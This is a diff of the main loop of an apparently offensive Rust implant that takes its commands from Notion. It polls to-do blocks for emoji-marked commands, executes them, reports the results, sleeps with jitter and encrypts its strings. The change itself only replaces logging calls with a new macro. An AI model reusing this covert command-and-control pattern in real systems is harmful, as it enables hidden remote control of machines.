@@ -32,6 +32,7 @@ use notion::{get_blocks, complete_command, create_page, send_result};
 mod cmd;
 use cmd::{NotionCommand, CommandType};
 mod logger;
+use logger::log_out;
 
 use_litcrypt!();
 
@@ -78,7 +79,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Start Notion App if configured to do so
     if config_options.launch_app {
-        logger.info(lc!("Launching app"));
+        logger.info(log_out!("Launching app"));
         let browser_cmd: String;
         #[cfg(windows)] {
             browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string();
@@ -105,7 +106,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         hn.push_str("*");
     }
 
-    logger.info(format!("Hostname: {hn}"));
+    logger.info(log_out!("Hostname: ", &hn));
     logger.debug(format!("Config options: {:?}", config_options));
 
     let mut headers = HeaderMap::new();
@@ -140,7 +141,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             match block["to_do"]["text"][0]["text"]["content"].as_str() {
                 Some(s) => {
                     if s.contains("🎯") {
-                        logger.info(format!("Got command: {s}"));
+                        logger.info(log_out!("Got command: ", s));
                         let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                         let output = notion_command.handle(&mut config_options, &logger).await?;
                         let command_block_id = block["id"].as_str().unwrap();
@@ -167,7 +168,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             time::Duration::from_secs(config_options.sleep_interval + jitter_time);
 
         thread::sleep(sleep_time);
-        logger.info(format!("zzzZZZzzz: {} seconds", config_options.sleep_interval));
-        logger.debug(format!("Jitter: {}", config_options.jitter_time));
+        logger.info(log_out!("zzzZZZzzz: ", &config_options.sleep_interval.to_string(), "seconds"));
+        logger.debug(log_out!("Jitter: ", &config_options.jitter_time.to_string()));
     }
 }
